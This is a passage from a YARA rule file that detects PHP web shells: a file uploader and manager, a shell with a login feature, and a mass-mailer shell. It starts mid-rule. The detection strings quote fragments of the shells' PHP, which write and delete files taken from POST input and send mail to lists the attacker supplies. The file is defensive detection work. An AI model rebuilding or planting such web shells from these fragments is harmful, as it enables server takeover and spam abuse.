      $s18 = "$whatshappening = \"WlhaaGJDZ25QejRuTG1kNmRXNWpiMjF3Y21WemN5aG5lbWx1Wm14aGRHVW9aM3BwYm1ac1lYUmxLR0poYzJVMk5GOWtaV052WkdVb2MzUnlj" ascii
      $s19 = "A2rXzHEGt9bdZV7ci3+fQA4BsvGEUeA\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}


/* Super Rules ------------------------------------------------------------- */

rule _shell_or_uploader {
   meta:
      description = "Shell or Uploader"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-02-09"
      hash1 = "5aed486e7f4bdb4eb33395d1a1531ec56b1870ffb4f1ea26fc8d4dc77fc60852"
      hash2 = "60017dff1e1f117d80152fd69df219fb92ed1dacf1c91643cd17d00179a45c15"
   strings:
      $s1 = "error_reporting(0); " fullword ascii
      $s2 = "$fp = fopen($_POST['path'],'w');" fullword ascii
      $s3 = "$pa = getcwd();" fullword ascii
      $s4 = "if(isset($_POST['src'])){" fullword ascii
      $s5 = "if(isset($_GET['path'])){" fullword ascii
      $s6 = "if(unlink($_POST['path'])){" fullword ascii
      $s7 = "if(rmdir($_POST['path'])){" fullword ascii
      $s8 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s9 = "$path = $_GET['path'];" fullword ascii
      $s10 = "$path = getcwd();" fullword ascii
      $s11 = "if($_POST['type'] == 'dir'){" fullword ascii
      $s12 = "if(isset($_GET['filesrc'])){" fullword ascii
      $s13 = "if(fwrite($fp,$_POST['src'])){" fullword ascii
      $s14 = "foreach($scandir as $file){" fullword ascii
      $s15 = "$scandir = scandir($path);" fullword ascii
      $s16 = "foreach($scandir as $dir){" fullword ascii
      $s17 = "$paths = explode('/',$path);" fullword ascii
      $s18 = "<input type=\\\"hidden\\\" name=\\\"path\\\" value=\\\"$path/$file\\\">" fullword ascii
      $s19 = "<input type=\\\"hidden\\\" name=\\\"path\\\" value=\\\"$path/$dir\\\">" fullword ascii
      $s20 = "echo '\">'.$pat.'</a>/';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_with_login {
   meta:
      description = "Shell with Login Feature"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-01"
      hash1 = "da1a2c174fc4efbac4e00e39156c6bbe01255e7d966307cba623d97bfe94316e"
      hash2 = "039f1bd70181f6feac74926693bb9cfa988ca6ca1c5f19ec51262301e2915e97"
   strings:
      $s1 = "$user = @get_current_user();" fullword ascii
      $s2 = "@ini_set('log_errors',0);" fullword ascii
      $s3 = "@ini_set('max_execution_time',0);" fullword ascii
      $s4 = "if(!function_exists('posix_getegid')) {" fullword ascii
      $s5 = "$gid = @getmygid();" fullword ascii
      $s6 = "$uid = @getmyuid();" fullword ascii
      $s7 = "$user = $uid['name'];" fullword ascii
      $s8 = "</form>\";" fullword ascii /* Goodware String - occured 1 times */
      $s9 = "$group = \"?\";" fullword ascii
      $s10 = "$group = $gid['name'];" fullword ascii
      $s11 = "$i .= (($p & 0x0100) ? 'r' : '-');" fullword ascii
      $s12 = "$i .= (($p & 0x0010) ? 'w' : '-');" fullword ascii
      $s13 = "$uid = $uid['uid'];" fullword ascii
      $s14 = "$gid = $gid['gid'];" fullword ascii
      $s15 = "$i .= (($p & 0x0080) ? 'w' : '-');" fullword ascii
      $s16 = "$i .= (($p & 0x0020) ? 'r' : '-');" fullword ascii
      $s17 = "$i .= (($p & 0x0002) ? 'w' : '-');" fullword ascii
      $s18 = "$i .= (($p & 0x0004) ? 'r' : '-');" fullword ascii
   condition:
      ( ( uint16(0) == 0x3f3c or uint16(0) == 0x3c20 ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mailer {
   meta:
      description = "shell in mailer form"
      author = "Renaltha P. B."
      reference = "https://github.com/renalthapb/Yara-Repo"
      date = "2023-03-27"
      hash1 = "79b19bf8217fc1acb855583c6b2b282be0370f38b0e1bd0974793ae60bcf5533"
      hash2 = "e96e0e5fa2edc90e1c6e5130a220059bfff263c6624bebc8416051472a97b3a9"
   strings:
      $s1 = "$headers  = \"MIME-Version: 1.0\\r\\n\";" fullword ascii
      $s2 = "$from = $_POST['from'];" fullword ascii
      $s3 = "$realname = $_POST['realname'];" fullword ascii
      $s4 = "$to = $_POST['emaillist'];" fullword ascii
      $s5 = "$headers .= \"From: \".$realname.\" <\".$from.\">\\r\\n\";" fullword ascii
      $s6 = "$testa = $_POST['veio'];" fullword ascii
      $s7 = "$subject = $_POST['subject'];" fullword ascii /* Goodware String - occured 1 times */
      $s8 = "$email = explode(\"\\n\", $to);" fullword ascii
      $s9 = "if($testa != \"\") {" fullword ascii
      $s10 = "while($email[$i]) {" fullword ascii
      $s11 = "  <input type=\"hidden\" name=\"veio\" value=\"sim\">" fullword ascii
      $s12 = "$message = $_POST['message'];" fullword ascii /* Goodware String - occured 2 times */
      $s13 = "$ok = \"ok\";" fullword ascii
      $s14 = "if($ok == \"ok\")" fullword ascii
      $s15 = "$count--;" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0xbbef or uint16(0) == 0x3f3c ) and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}
